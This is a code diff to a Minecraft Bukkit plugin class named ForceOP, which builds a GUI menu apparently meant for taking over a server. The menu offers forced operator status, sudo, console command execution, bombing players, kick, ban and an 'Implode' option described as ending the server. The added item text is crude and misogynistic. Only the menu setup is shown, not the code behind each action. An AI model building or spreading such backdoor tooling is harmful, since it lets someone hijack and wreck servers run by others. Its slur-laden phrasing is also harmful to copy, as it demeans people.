@@ -5,6 +5,7 @@ import java.util.Arrays;
 import java.util.List;
 
 import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
@@ -15,16 +16,14 @@ import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 
-import net.md_5.bungee.api.ChatColor;
-
-public class Forceop implements Listener {
+public class ForceOP implements Listener {
 
 	private Inventory inv;
 	private List<String> players;
-
+	
 	private	ItemStack sudo,op,bomb,bomball,console,stack,kill,kick,ban,implode,border;
 
-	public Forceop() {
+	public ForceOP() {
 		players = new ArrayList<String>();
 		inv = Bukkit.createInventory(null, 54, ChatColor.DARK_RED + "Force" + ChatColor.RED + "op");
 		setupGui();
@@ -39,16 +38,16 @@ public class Forceop implements Listener {
 	}
 
 	public void setupGui() {
-		sudo = createItem(Material.STRING, 1, (byte)0, "&e&lSudo", Arrays.asList("", ""));
-		op = createItem(Material.DIAMOND, 1, (byte)0, "&e&lOp", Arrays.asList("", ""));
-		bomb = createItem(Material.TNT, 1, (byte)0, "&e&lBomb", Arrays.asList("", ""));
-		bomball = createItem(Material.TNT, 2, (byte)0, "&e&lBomb all", Arrays.asList("", ""));
-		console = createItem(Material.BLAZE_ROD, 1, (byte)0, "&e&lConsole", Arrays.asList("", ""));
-		stack = createItem(Material.EMERALD, 1, (byte)0, "&e&lStack", Arrays.asList("", ""));
-		kill = createItem(Material.DIAMOND_SWORD, 1, (byte)0, "&e&lKill", Arrays.asList("", ""));
-		kick = createItem(Material.LEATHER_BOOTS, 1, (byte)0, "&e&lKick", Arrays.asList("", ""));
-		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte)0, "&e&lBan", Arrays.asList("", ""));
-		implode = createItem(Material.BARRIER, 1, (byte)0, "&c&lImplode", Arrays.asList("", ""));
+		sudo = createItem(Material.STRING, 1, (byte)0, "&e&lSudo", Arrays.asList("&DForce a bitch to", "&Drun any command you want"));
+		op = createItem(Material.DIAMOND, 1, (byte)0, "&e&lOp", Arrays.asList("&DGet that dank operator status", ""));
+		bomb = createItem(Material.TNT, 1, (byte)0, "&e&lBomb", Arrays.asList("&DBlow that bitch", ""));
+		bomball = createItem(Material.TNT, 2, (byte)0, "&e&lBomb all", Arrays.asList("&DBlow all bitches", "on the server"));
+		console = createItem(Material.BLAZE_ROD, 1, (byte)0, "&e&lConsole", Arrays.asList("&DForce console to run anything", " "));
+		stack = createItem(Material.EMERALD, 1, (byte)0, "&e&lStack", Arrays.asList("&DMake that item", "&Din your hand", "into a stack"));
+		kill = createItem(Material.DIAMOND_SWORD, 1, (byte)0, "&e&lKill", Arrays.asList("&DKill that hoe", ""));
+		kick = createItem(Material.LEATHER_BOOTS, 1, (byte)0, "&e&lKick", Arrays.asList("&DFuck that bitch up", ""));
+		ban = createItem(Material.DIAMOND_BOOTS, 1, (byte)0, "&e&lBan", Arrays.asList("&DFuck that bitch up", "&Dforever"));
+		implode = createItem(Material.BARRIER, 1, (byte)0, "&c&lImplode", Arrays.asList("&cWell... Say bye", "to the server you're on"));
 		border = createItem(Material.STAINED_GLASS_PANE, 1, (byte)0, "&f&lForceOP", Arrays.asList(""));
 		
 		for(int i = 0; i < 54; i++) {
